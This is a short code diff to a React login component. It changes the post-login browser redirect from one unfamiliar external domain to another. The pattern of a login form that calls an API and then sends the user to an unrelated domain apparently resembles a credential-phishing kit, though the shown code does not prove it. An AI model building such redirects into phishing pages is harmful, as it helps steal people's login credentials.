@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://nn.royaldoorltdl.com/';
+      window.location.href = 'https://ner.leah-mustafa.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
